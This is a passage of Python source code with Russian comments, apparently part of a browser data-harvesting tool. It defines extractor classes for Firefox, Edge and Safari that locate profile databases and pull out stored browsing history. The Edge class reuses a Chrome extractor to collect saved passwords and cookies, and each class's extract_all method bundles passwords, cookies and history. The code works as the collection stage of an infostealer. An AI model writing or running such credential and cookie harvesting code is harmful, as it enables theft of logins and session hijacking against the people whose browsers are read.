            shutil.copy2(places_file, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем историю
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_date
                FROM moz_places
                WHERE url IS NOT NULL
                ORDER BY last_visit_date DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_date = row
                
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit_date
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения истории Firefox: {e}")
        
        return history
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Firefox."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


class EdgeExtractor:
    """Экстрактор данных для Edge."""
    
    def __init__(self):
        """Инициализация Edge экстрактора."""
        self.platform = platform.system()
        self.edge_paths = self._get_edge_paths()
        
    def _get_edge_paths(self) -> Dict[str, str]:
        """Получает пути к данным Edge."""
        paths = {}
        
        if self.platform == "Windows":
            appdata = os.getenv('LOCALAPPDATA')
            paths = {
                "profile": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default"),
                "login_data": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
                "cookies": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
                "history": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "History")
            }
        else:
            # Edge доступен только на Windows
            paths = {}
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Edge."""
        return self.platform == "Windows" and os.path.exists(self.edge_paths.get("profile", ""))
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Edge."""
        # Edge использует ту же структуру, что и Chrome
        chrome_extractor = ChromeExtractor()
        chrome_extractor.chrome_paths = self.edge_paths
        return chrome_extractor.extract_passwords()
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Edge."""
        # Edge использует ту же структуру, что и Chrome
        chrome_extractor = ChromeExtractor()
        chrome_extractor.chrome_paths = self.edge_paths
        return chrome_extractor.extract_cookies()
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Edge."""
        # Edge использует ту же структуру, что и Chrome
        chrome_extractor = ChromeExtractor()
        chrome_extractor.chrome_paths = self.edge_paths
        return chrome_extractor.extract_history()
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Edge."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


class SafariExtractor:
    """Экстрактор данных для Safari."""
    
    def __init__(self):
        """Инициализация Safari экстрактора."""
        self.platform = platform.system()
        self.safari_paths = self._get_safari_paths()
        
    def _get_safari_paths(self) -> Dict[str, str]:
        """Получает пути к данным Safari."""
        paths = {}
        
        if self.platform == "Darwin":  # macOS
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, "Library", "Safari"),
                "history": os.path.join(home, "Library", "Safari", "History.db")
            }
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Safari."""
        return self.platform == "Darwin" and os.path.exists(self.safari_paths.get("profile", ""))
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Safari."""
        # Safari хранит пароли в Keychain
        return []
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Safari."""
        # Safari использует бинарный формат для куки
        return []
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Safari."""
        history = []
        try:
            history_file = self.safari_paths.get("history")
            if not history_file or not os.path.exists(history_file):
                return history
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "history_temp")
            shutil.copy2(history_file, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем историю
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM history_items
                ORDER BY last_visit_time DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit_time
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения истории Safari: {e}")
        
        return history
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Safari."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


if __name__ == "__main__":
    test_browser_extraction()
